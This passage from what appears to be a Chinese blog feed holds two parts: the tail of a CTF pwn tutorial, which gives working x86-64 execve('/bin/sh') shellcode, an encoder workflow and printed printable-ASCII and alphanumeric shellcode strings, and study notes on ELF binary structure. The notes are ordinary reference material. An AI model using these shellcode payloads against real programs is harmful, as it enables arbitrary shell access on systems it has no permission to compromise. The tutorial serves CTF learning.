class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure><p>这样生成的shellcode就只有30字节，一般这种大小就足够了。</p><h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><h4 id="可打印ascii"><a href="#可打印ascii" class="headerlink" title="可打印ascii"></a>可打印ascii</h4><p>这一种的限制一般是要求shellcode为可打印字符，包括字母、数字、符号。</p><p>针对这一种白名单，已经有了一个不错的工具：<a href="https://github.com/rcx/shellcode_encoder" target="_blank" rel="noopener">shellcode_encoder</a></p><p>使用这一工具首先需要安装z3-solver：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install z3-solver</span><br></pre></td></tr></table></figure><p>开始生成可打印shellcode前，我们需要先将原来的shellcode输出到一个文件中，这里我们用python来执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">f = open(<span class="string">'shellcode'</span>,<span class="string">'wb+'</span>)</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后，将生成的shellcode文件放到shellcode_encoder目录下，运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python main.py shellcode rax+29</span><br></pre></td></tr></table></figure><p>其中，shellcode是我们生成的shellcode文件，然后因为漏洞程序是通过call rax调用shellcode的，以及shellcode_encoder生成shellcode时的偏移位置，所以这里用了rax+29。</p><p>然后就会自动生成可打印的shellcode了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Original length: 30</span><br><span class="line">Encoded length:  476</span><br><span class="line">Preamble length: 29</span><br><span class="line">Total length:    505</span><br><span class="line"></span><br><span class="line">PPTAYAXVI31VXXXf-C_f-@hf-&#96;8PZTAYAXVI31VXPP[_Hc4:14:SX- (mz-i Wx5?&lt;??P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-IL+N-@x6x5?41&#125;P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-Txl(-H0| 5V__&gt;P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-Gz#&#39;-~  @5?_?_P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-e3&#39;R-T)@~5O ^?P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-&amp;Pu8-( @@57O?oP^14:WX-|w_?-@U@C-@3&#96;&#125;P_SX-:AXH-#?Hx5;~_?P_Hc4:14:SX- $80- ,  5?M7?P^14:WX-|w_?-@U@C-@3&#96;&#125;P_SX-@dG1- dyo5&lt;6?_P^SX-zphB-&#96;&#96;(~5&gt;&#x2F;o?P_AAAAo&#123;5mTM&#x3D;K8_?* *v k1jXk_DC(%r:ou&#125;&#125;n;oopM]alYoM0&quot;+&#x2F;O%Y2P9@&quot;USR2|O?+</span><br></pre></td></tr></table></figure><p>可以看到shellcode的总长是505，这样的长度对于某些特定的题目来说是不行的，所以下面介绍另一种shellcode。</p><h4 id="纯数字字母shellcode"><a href="#纯数字字母shellcode" class="headerlink" title="纯数字字母shellcode"></a>纯数字字母shellcode</h4><p>文章：<a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a></p><p>这里就不具体分析了，直接给出最终的shellcode，感兴趣的可以自行阅读学习</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shellcode&quot;&gt;&lt;a href=&quot;#shellcode&quot; class=&quot;headerlink&quot; title=&quot;shellcode&quot;&gt;&lt;/a&gt;shellcode&lt;/h1&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="文章" scheme="https://nuoye-blog.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="shellcode" scheme="https://nuoye-blog.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>《Linux二进制分析》</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:28:58.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux环境和相关工具"><a href="#Linux环境和相关工具" class="headerlink" title="Linux环境和相关工具"></a>Linux环境和相关工具</h1><h2 id="Linux工具"><a href="#Linux工具" class="headerlink" title="Linux工具"></a>Linux工具</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><p>GNU调试器</p><h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>objdump -D ELF    查看ELF文件中所有节的数据或代码</p><p>objdump -d ELF    只查看ELF文件中的程序代码</p><p>objdump -tT ELF    查看所有符号</p><h3 id="objcopy"><a href="#objcopy" class="headerlink" title="objcopy"></a>objcopy</h3><p>要将.data节从一个ELF目标文件复制到另一个文件中，可以使用下面的指令：</p><p>objcopy -only-section=.data &lt;infile&gt; &lt;outfile&gt;</p><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>system call trace是基于ptrace(2)系统调用的一款工具。通过在一个循环中使用PTRACE_SYSCALL请求来显示运行中程序的系统调用活动相关的信息以及程序执行中捕捉到的信号量。</p><p>使用strace命令来跟踪一个基本程序：</p><p>strace /bin/ls -o ls.out</p><p>使用strace命令附加到一个现存的进程上：</p><p>strace -p &lt;pid&gt; -o daemon.out</p><p>原始输出将会显示每个系统调用的文件描述编号，系统调用会将文件描述符作为参数：SYS_read(3,buf,sizeof(buf))</p><p>如果想查看读入到文件描述符3中的所有数据，可以运行下面的命令：</p><p>strace -e read=3 /bin/ls</p><h3 id="ltrace"><a href="#ltrace" class="headerlink" title="ltrace"></a>ltrace</h3><p>ltrace与strace非常类似。ltrace会解析共享库，并打印出用到的库函数。</p><h3 id="ftrace"><a href="#ftrace" class="headerlink" title="ftrace"></a>ftrace</h3><p>与ltrace类似，但还可以显示出二进制文件本身的函数调用。</p><p><a href="https://github.com/elfmaster/ftrace" target="_blank" rel="noopener">https://github.com/elfmaster/ftrace</a></p><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><p>-h    查看ELF文件头</p><p>-S    查询节表头</p><p>-l    查询程序头表</p><p>-s    查询符号表</p><p>-e    查询ELF文件头数据</p><p>-r    查询重定位入口</p><p>-d    查询动态段</p><h3 id="ERESI"><a href="#ERESI" class="headerlink" title="ERESI"></a>ERESI</h3><p><a href="http://www.eresi-project.org" target="_blank" rel="noopener">http://www.eresi-project.org</a></p><h6 id="两篇文章："><a href="#两篇文章：" class="headerlink" title="两篇文章："></a>两篇文章：</h6><p>Cerberus ELF interface（<a href="http://www.phrack.org/archives/issues/61/8.txt）" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/61/8.txt）</a><br>Embedded ELF debugging（<a href="http://www.phrack.org/archives/issues/63/9.txt）" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/63/9.txt）</a></p><h3 id="有用的设备和文件"><a href="#有用的设备和文件" class="headerlink" title="有用的设备和文件"></a>有用的设备和文件</h3><h3 id="proc-lt-pid-gt-maps"><a href="#proc-lt-pid-gt-maps" class="headerlink" title="/proc/&lt;pid&gt;/maps"></a>/proc/&lt;pid&gt;/maps</h3><p>该文件保存了一个进程镜像的布局，通过展现每个内存映射来实现，展现的内容包括可执行文件、共享库、栈、堆和VDSO等。</p><h3 id="proc-kcore"><a href="#proc-kcore" class="headerlink" title="/proc/kcore"></a>/proc/kcore</h3><p>是Linux内核的动态核心文件，即以ELF核心文件的形式所展现出来的原生内存转储。</p><h3 id="boot-System-map"><a href="#boot-System-map" class="headerlink" title="/boot/System.map"></a>/boot/System.map</h3><p>这个文件包含了整个内核的所有符号。</p><h3 id="proc-kallsyms"><a href="#proc-kallsyms" class="headerlink" title="/proc/kallsyms"></a>/proc/kallsyms</h3><p>与System.map类似，区别就是kallsyms是内核所属的/proc的一个入口并且可以动态更新。如果安装了新的LKM，符号会自动添加到里面去。</p><h3 id="proc-iomem"><a href="#proc-iomem" class="headerlink" title="/proc/iomem"></a>/proc/iomem</h3><p>与/proc/&lt;pid&gt;/maps类似，不过它是跟系统内存相关的。</p><h3 id="ECFS"><a href="#ECFS" class="headerlink" title="ECFS"></a>ECFS</h3><p>extended core file snapshot（扩展核心文件快照）是一项特殊的核心转储技术，专门为进程镜像的高级取证分析所设计。</p><p> <a href="https://github.com/elfmaster/ecfs" target="_blank" rel="noopener">https://github.com/elfmaster/ecfs</a></p><h2 id="链接器相关环境指针"><a href="#链接器相关环境指针" class="headerlink" title="链接器相关环境指针"></a>链接器相关环境指针</h2><h3 id="LD-PRELOAD环境变量"><a href="#LD-PRELOAD环境变量" class="headerlink" title="LD_PRELOAD环境变量"></a>LD_PRELOAD环境变量</h3><p>可以设置成一个指定的库路径，动态链接时可以比其他库有更高的优先级。</p><h3 id="LD-SHOW-AUXV环境变量"><a href="#LD-SHOW-AUXV环境变量" class="headerlink" title="LD_SHOW_AUXV环境变量"></a>LD_SHOW_AUXV环境变量</h3><p>能够通知程序加载器来展示程序运行时的辅助向量。</p><p>辅助向量是放在程序栈（通过内核的ELF常规加载方式）上的信息，附带了传递给动态链接器的程序相关的特定信息。</p><h3 id="链接器脚本"><a href="#链接器脚本" class="headerlink" title="链接器脚本"></a>链接器脚本</h3><p>默认的链接器脚本可以使用ld -verbose查看。</p><h1 id="ELF二进制格式"><a href="#ELF二进制格式" class="headerlink" title="ELF二进制格式"></a>ELF二进制格式</h1><h2 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h2><p>ET_NONE：未知类型</p><p>ET_REL：重定位文件</p><p>ET_EXEC：可执行文件</p><p>ET_DYN：共享目标文件</p><p>ET_CORE：核心文件</p><h2 id="ELF程序头"><a href="#ELF程序头" class="headerlink" title="ELF程序头"></a>ELF程序头</h2><p>Elf32_Phdr结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">unit32_t</span> p_type;<span class="comment">//segment type</span></span><br><span class="line">Elf32_off p_offset;<span class="comment">//segment offset</span></span><br><span class="line">Elf32_Addr p_vaddr;<span class="comment">//segment virtual address</span></span><br><span class="line">Elf32_Addr p_paddr;<span class="comment">//segment physical address</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_filesz;<span class="comment">//size of segment in file</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_memsz;<span class="comment">//size of segment in memory</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_flags;<span class="comment">//segment flags,I.E execute|read|write</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_align;<span class="comment">//segment alignment in memory</span></span><br><span class="line">&#125;Elf32_Phdr</span><br></pre></td></tr></table></figure><h3 id="PT-LOAD"><a href="#PT-LOAD" class="headerlink" title="PT_LOAD"></a>PT_LOAD</h3><p>一个可执行文件至少有一个PT_LOAD类型的段。这类程序头描述的是可装载的段，也就是这种类型的段将被装载或者映射到内存中。</p><h3 id="PT-DYNAMIC"><a href="#PT-DYNAMIC" class="headerlink" title="PT_DYNAMIC"></a>PT_DYNAMIC</h3><p>动态段的Phdr。动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容：</p><ul><li>运行时需要链接的共享库列表；</li><li>全局偏移表（GOT）的地址；</li><li>重定位条目的相关信息。</li></ul><p>32位ELF的动态段的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">Elf32_Sword d_tag;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line">Elf32_Word d_val;</span><br><span class="line">Elf32_Addr d_ptr;</span><br><span class="line">&#125;d_un;</span><br><span class="line">&#125;Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure><h3 id="PT-NOTE"><a href="#PT-NOTE" class="headerlink" title="PT_NOTE"></a>PT_NOTE</h3><p>该类型的段可能保存了与特定供应商或者系统相关的附加信息。</p><p>NOTE段病毒感染相关信息：<a href="http://vxheavens.com/lib/vhe06.html" target="_blank" rel="noopener">http://vxheavens.com/lib/vhe06.html</a></p><h3 id="PT-INTERP"><a href="#PT-INTERP" class="headerlink" title="PT_INTERP"></a>PT_INTERP</h3><p>PT_INTERP段只将位置和大小信息存放在一个以null为终止符的字符串中，是对程序解释器位置的描述。</p><h3 id="PT-PHDR"><a href="#PT-PHDR" class="headerlink" title="PT_PHDR"></a>PT_PHDR</h3><p>该段保存了程序头表本身的位置和大小。Phdr表保存了所有的Phdr堆文件（以及内存镜像）中段的描述信息。</p><p>可以用readelf -l <file>命令查看文件的Phdr表</p><h2 id="ELF节头"><a href="#ELF节头" class="headerlink" title="ELF节头"></a>ELF节头</h2><h3 id="段和节的区分"><a href="#段和节的区分" class="headerlink" title="段和节的区分"></a>段和节的区分</h3><p>段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。</p><h3 id="32位ELF节头的结构："><a href="#32位ELF节头的结构：" class="headerlink" title="32位ELF节头的结构："></a>32位ELF节头的结构：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_name;<span class="comment">//offset into shdr string table for shdr name</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_type;<span class="comment">//shdr type, I.E SHT_PROGBITS</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_flags;<span class="comment">//shdr flags, I.E SHT_WRITE|SHT_ALLOC</span></span><br><span class="line">Elf32_ADDR sh_addr;<span class="comment">//address of where section begins</span></span><br><span class="line">Elf32_Off sh_offset;<span class="comment">//offset of shdr from beginning of file</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_size;<span class="comment">//size that section takes up on disk</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_link;<span class="comment">//points to another section</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_info;<span class="comment">//interpretation depends on section type</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_addralign;<span class="comment">//alignment for address of section</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_entsize;<span class="comment">//size of each certain entries that may be in section</span></span><br><span class="line">&#125;Elf32_Shdr</span><br></pre></td></tr></table></figure><h3 id="text节"><a href="#text节" class="headerlink" title=".text节"></a>.text节</h3><p>该节是保存了程序代码指令的代码节，存在于text段中。此节类型为SHT_PROGBITS</p><h3 id="rodata节"><a href="#rodata节" class="headerlink" title=".rodata节"></a>.rodata节</h3><p>该节保存了只读数据。存在于一个可执行文件的只读段中，即只能在text段中找到.rodata节。该节类型为SHT_PROGBITS。</p><h3 id="plt节"><a href="#plt节" class="headerlink" title=".plt节"></a>.plt节</h3><p>该节中包含了动态链接器调用从共享库导入的函数所必需的相关代码。存在于text段中。此节类型为SHT_PROGBITS。</p><h3 id="data节"><a href="#data节" class="headerlink" title=".data节"></a>.data节</h3><p>.data节存在于data段中，保存了初始化的全局变量等数据。此节类型为SHT_PROGBITS</p><h3 id="bss节"><a href="#bss节" class="headerlink" title=".bss节"></a>.bss节</h3><p>保存了未进行初始化的全局数据，是data段的一部分，占用空间不超过4字节，仅表示这个节本身的空间。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于为保存实际的数据，此节类型为SHT_NOBITS</p><h3 id="got-plt节"><a href="#got-plt节" class="headerlink" title=".got.plt节"></a>.got.plt节</h3><p>.got节保存了全局偏移表。.got.plt节跟程序执行有关，因此节类型被标记为SHT_PROGBITS。</p><h3 id="dynsym节"><a href="#dynsym节" class="headerlink" title=".dynsym节"></a>.dynsym节</h3><p>该节保存了从动态共享库导入的动态符号信息，该节保存在text段。节类型为SHT_DYNSYM</p><h3 id="dynstr节"><a href="#dynstr节" class="headerlink" title=".dynstr节"></a>.dynstr节</h3><p>该节保存了动态符号字符串表，表中存放了一系列字符串，这些字符串代码了符号的名称，以空字符作为终止符。</p><h3 id="rel-节"><a href="#rel-节" class="headerlink" title=".rel.*节"></a>.rel.*节</h3><p>重定位节保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，堆ELF目标文件的某部分内容或者进程镜像进行补充和修改。节类型为SHT_REL。</p><h3 id="hash节"><a href="#hash节" class="headerlink" title=".hash节"></a>.hash节</h3><p>有时也被称为.gnu.hash，保存了一个用于查找符号的散列表。</p><h3 id="symtab节"><a href="#symtab节" class="headerlink" title=".symtab节"></a>.symtab节</h3><p>该节保存了ElfN_Sym类型的符号信息。该节类型为SHT_SYMTAB</p><h3 id="strtab节"><a href="#strtab节" class="headerlink" title=".strtab节"></a>.strtab节</h3><p>该节保存的是符号字符串表，表中内容会被.symtab的ElfN_Sym结构中的st_name条目引用，此节类型为SHT_STRTAB。</p><h3 id="shstrtab节"><a href="#shstrtab节" class="headerlink" title=".shstrtab节"></a>.shstrtab节</h3><p>该节保存节头子符串表，该表是一个以空字符终止的字符串集合，字符串保存了每个节的节名。有一个名为e_shsrndx的ELF文件头条目会指向.shstrtab节，e_shstrndx中保存了.shstrtab的偏移量。此节类型为SHT_STRTAB。</p><h3 id="ctors和-dtors节"><a href="#ctors和-dtors节" class="headerlink" title=".ctors和.dtors节"></a>.ctors和.dtors节</h3><p>.ctors（构造器）和.dtors（析构器）这两个节保存了指向构造函数和析构函数的函数指针。（构造函数即main函数执行之前需要执行的代码，析构函数是在main函数之后需要执行的代码。）</p><h3 id="ELF文件布局"><a href="#ELF文件布局" class="headerlink" title="ELF文件布局"></a>ELF文件布局</h3><h4 id="text段："><a href="#text段：" class="headerlink" title="text段："></a>text段：</h4><p>[.text]：程序代码。</p><p>[.rodata]：只读数据。</p><p>[.hash]：符号散列表。</p><p>[.dynsym]：共享目标文件符号数据。</p><p>[.dynstr]：共享目标文件符号名称。</p><p>[.plt]：过程链接表。</p><p>[.rel.got]：G.O.T 重定位数据。</p><h4 id="data段："><a href="#data段：" class="headerlink" title="data段："></a>data段：</h4><p>[.data]：全局的初始化变量。</p><p>[.dynamic]：动态链接结构和对象。</p><p>[.got.plt]：全局偏移表。</p><p>[.bss]：全局未初始化变量。</p><h3 id="ELF符号"><a href="#ELF符号" class="headerlink" title="ELF符号"></a>ELF符号</h3><p>.dynsym保存了引用来自外部文件符号的全局符号。.dynsym保存的符号是.symtab所保存符号的子集，.symtab中还保存了可执行文件的本地符号，如全局变量或者代码中定义的本地函数等。</p><p>.dynsym是被标记了ALLOC的，而.symtab则没有被标记。ALLOC表示有该标记的节会在运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载到内存中。</p><p>64位ELF文件符号项的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> st_name;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line"><span class="keyword">uint16_t</span> st_shndx;</span><br><span class="line">Elf64_Addr st_value;</span><br><span class="line">Uint64_t st_size;</span><br><span class="line">&#125;Elf64_Sym;</span><br></pre></td></tr></table></figure><p>符号项保存在.symtab和.dynsym节中，因此节头项的大小与ElfN_Sym的大小相等。</p><h3 id="st-name"><a href="#st-name" class="headerlink" title="st_name"></a>st_name</h3><p>保存了指向符号表中字符串的偏移地址，偏移地址存放着符号的名称。</p><h3 id="st-value"><a href="#st-value" class="headerlink" title="st_value"></a>st_value</h3><p>存放符号的值（可能是地址或者位置偏移量）</p><h3 id="st-size"><a href="#st-size" class="headerlink" title="st_size"></a>st_size</h3><p>存放了一个符号的大小。</p><h3 id="st-other"><a href="#st-other" class="headerlink" title="st_other"></a>st_other</h3><p>定义了符号的可见性。</p><h3 id="st-shndx"><a href="#st-shndx" class="headerlink" title="st_shndx"></a>st_shndx</h3><p>保存了相关节头表的索引。</p><h3 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h3><p>指定符号类型及绑定属性：</p><p>1.符号类型：</p><p>STT_NOTYPE    符号类型未定义</p><p>STT_FUNC    表示该符号与函数或者其他可执行代码关联</p><p>STT_OBJECT    表示该符号与数据目标文件关联</p><p>2.符号绑定</p><p>STB_LOCAL    本地符号在目标文件之外是不可见的</p><p>STB_GLOBAL    全局符号对于所有要合并的目标文件来说都是可见的，一个全局符号在一个文件中进行定义后，另一个文件可以对这个符号进行引用。</p><p>STB_WEAK    与全局绑定类似，不过比STB_GLOBAL的优先级低。被标记为STB_WEAK的符号有可能被同名的未被标记为STB_WEAK的符号覆盖</p><h6 id="对绑定和类型字段进行打包和解包的宏指令"><a href="#对绑定和类型字段进行打包和解包的宏指令" class="headerlink" title="对绑定和类型字段进行打包和解包的宏指令"></a>对绑定和类型字段进行打包和解包的宏指令</h6><p>ELF32_ST_BIND(info)或者ELF64_ST_BIND(info)：从st_info值中提取出一个绑定。</p><p>ELF32_ST_TYPE(info)或者ELF64_ST_TYPE(info)：从st_info值中提取类型。</p><p>ELF32_ST_TYPE(bind,type)或者ELF64_ST_INFO(bind,type)：将一个绑定和类型转换成st_info值。</p><h2 id="ELF重定位"><a href="#ELF重定位" class="headerlink" title="ELF重定位"></a>ELF重定位</h2><p>要将一个偏移量计算成虚拟地址，可以用下面的公式：</p><p>address_of_call+offset+sizeof(addr)</p><h3 id="基于二进制修补的重定位代码注入"><a href="#基于二进制修补的重定位代码注入" class="headerlink" title="基于二进制修补的重定位代码注入"></a>基于二进制修补的重定位代码注入</h3><p>Eresi（<a href="http://www.eresi-project.org）" target="_blank" rel="noopener">http://www.eresi-project.org）</a></p><p>Quenya (<a href="http://www.bitlackeys.org/projects/quenya_32bit.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/quenya_32bit.tgz</a>)</p><h2 id="ELF动态链接"><a href="#ELF动态链接" class="headerlink" title="ELF动态链接"></a>ELF动态链接</h2><h3 id="辅助向量"><a href="#辅助向量" class="headerlink" title="辅助向量"></a>辅助向量</h3><p>通过系统调用 sys_execve()将程序加载到内存中时，对应的可执行文件会被映射到内存的地址空间，并为该进程的地址空间分配一个栈。这个栈会用特定的方式向动态链接器传递信息。这种特定的对信息的设置和安排即为辅助向量（auxv）。</p><p>辅助向量是一系列Elf_auxv_t结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">uint64_t</span> a_type;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> a_val;</span><br><span class="line">&#125;a_un;</span><br><span class="line">&#125;Elf64_auxv_t;</span><br></pre></td></tr></table></figure><p>a_type指定了辅助向量的条目类型，a_val为辅助向量的值。</p><p>下面是动态链接器所需要的一些最重要的条目类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_EXECFD2<span class="comment">//File descriptor of program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PATH3<span class="comment">//Program headers for program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHENT4<span class="comment">//Size of program header entry</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHNUM5<span class="comment">//Number of program headers</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PAGESZ6<span class="comment">//System page size</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_ENTRY9<span class="comment">//Entry point of program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#deffine AT_UID11<span class="comment">//Real uid</span></span></span><br></pre></td></tr></table></figure><p>程序被加载进内存，辅助向量被填充好之后，控制权就交给了动态链接器。动态链接器会解析要链接到进程地址空间的用于共享库的符号和重定位。</p><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>GOT的前3个偏移量</p><p>GOT[0]：存放了指向可执行文件动态段的地址，动态链接器利用该地址提取动态链接相关信息。</p><p>GOT[1]：存放link_map结构的地址，动态链接器利用该地址来对符号进行解析。</p><p>GOT[2]：存放了指向动态链接器_dl_runtime_resolve()函数的地址，该函数用来解析共享库函数的实际符号地址。</p><h3 id="动态段"><a href="#动态段" class="headerlink" title="动态段"></a>动态段</h3><p>动态段保存了一个由类型为ElfN_Dyn的结构体组成的数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">Elf32_Sword d_tag;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line">Elf32_Word d_val;</span><br><span class="line">Elf32_Addr d_ptr;</span><br><span class="line">&#125;d_un;</span><br><span 